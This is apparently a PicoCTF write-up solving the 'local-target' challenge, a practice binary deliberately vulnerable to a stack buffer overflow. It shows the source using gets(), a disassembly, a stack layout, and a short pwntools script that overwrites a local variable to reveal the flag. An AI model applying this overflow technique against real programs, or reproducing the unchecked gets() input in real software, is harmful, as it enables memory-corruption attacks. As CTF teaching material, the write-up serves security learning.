# PicoCTF: local-target

```c
     1  #include <stdio.h>
     2  #include <stdlib.h>
     3
     4
     5
     6  int main(){
     7    FILE *fptr;
     8    char c;
     9
    10    char input[16];
    11    int num = 64;
    12
    13    printf("Enter a string: ");
    14    fflush(stdout);
    15    gets(input);
    16    printf("\n");
    17
    18    printf("num is %d\n", num);
    19    fflush(stdout);
    20
    21    if( num == 65 ){
    22      printf("You win!\n");
    23      fflush(stdout);
    24      // Open file
    25      fptr = fopen("flag.txt", "r");
    26      if (fptr == NULL)
    27      {
    28          printf("Cannot open file.\n");
    29          fflush(stdout);
    30          exit(0);
    31      }
    32
    33      // Read contents from file
    34      c = fgetc(fptr);
    35      while (c != EOF)
    36      {
    37          printf ("%c", c);
    38          c = fgetc(fptr);
    39      }
    40      fflush(stdout);
    41
    42      printf("\n");
    43      fflush(stdout);
    44      fclose(fptr);
    45      exit(0);
    46    }
    47
    48    printf("Bye!\n");
    49    fflush(stdout);
    50  }
```

```bash
$  file local-target
local-target: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=63ee240a209d887ec451e996d844362e7e5c2078, for GNU/Linux 3.2.0, not stripped
```

```bash
$  checksec local-target
[*] '/home/koukyosyumei/Dev/CTFWriteUps/stackoverflow/local-target/local-target'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

We can get `flag` if we can change `num` from 64 to 65. Since `get` at the line 15 does not check the size of the input, it seems that we can modify `num` by stack overflow.

The first thing we should do is check the location of `num` in the stack.

```bash
$  x86_64-linux-gnu-objdump -d local-target
```

We can find that the `main` function first allocates 0x20 bytes to the stack and then put 0x40=64 to `-0x8(%rbp)`. In addition, since `ebp=-0x20(%rbp)` is set to the first argument of `gets`, we can also say that `input` is stored at `-0x20(%rbp)`. 

```
0000000000401236 <main>:
  401236:       f3 0f 1e fa             endbr64
  40123a:       55                      push   %rbp
  40123b:       48 89 e5                mov    %rsp,%rbp
  40123e:       48 83 ec 20             sub    $0x20,%rsp
  401242:       c7 45 f8 40 00 00 00    movl   $0x40,-0x8(%rbp)        # int num = 64;
  401249:       48 8d 3d b4 0d 00 00    lea    0xdb4(%rip),%rdi        # 402004 <_IO_stdin_used+0x4>
  401250:       b8 00 00 00 00          mov    $0x0,%eax
  401255:       e8 96 fe ff ff          call   4010f0 <printf@plt>
  40125a:       48 8b 05 0f 2e 00 00    mov    0x2e0f(%rip),%rax        # 404070 <stdout@GLIBC_2.2.5>
  401261:       48 89 c7                mov    %rax,%rdi
  401264:       e8 b7 fe ff ff          call   401120 <fflush@plt>
  401269:       48 8d 45 e0             lea    -0x20(%rbp),%rax
  40126d:       48 89 c7                mov    %rax,%rdi
  401270:       b8 00 00 00 00          mov    $0x0,%eax
  401275:       e8 96 fe ff ff          call   401110 <gets@plt>
  40127a:       bf 0a 00 00 00          mov    $0xa,%edi
  40127f:       e8 3c fe ff ff          call   4010c0 <putchar@plt>
  401284:       8b 45 f8                mov    -0x8(%rbp),%eax
  401287:       89 c6                   mov    %eax,%esi
  401289:       48 8d 3d 85 0d 00 00    lea    0xd85(%rip),%rdi        # 402015 <_IO_stdin_used+0x15>
  401290:       b8 00 00 00 00          mov    $0x0,%eax
  401295:       e8 56 fe ff ff          call   4010f0 <printf@plt>
  40129a:       48 8b 05 cf 2d 00 00    mov    0x2dcf(%rip),%rax        # 404070 <stdout@GLIBC_2.2.5>
  4012a1:       48 89 c7                mov    %rax,%rdi
```

The overview of the stack is as follows:

```
|___________|
|           | <- `input`
| 0x20 byte |
|           |
|           | <- `num=0x40` is stored in -0x8(%rbp)
|___________|
|    rbp    |
```

Thus, we can get the flag with the following script.

```py
from pwn import *
import binascii

context.log_level = 'error'

r = process("./local-target")
# r = remote("saturn.picoctf.net", 61750)
print(r.recvuntil(b"Enter a string:"))

r.sendline(b"A"*24 + p64(65))
print(r.recvall())
```

```bash
$  python3 solution.py
b'Enter a string:'
b' \nnum is 65\nYou win!\nDUMMYFLAG\n\n'
```




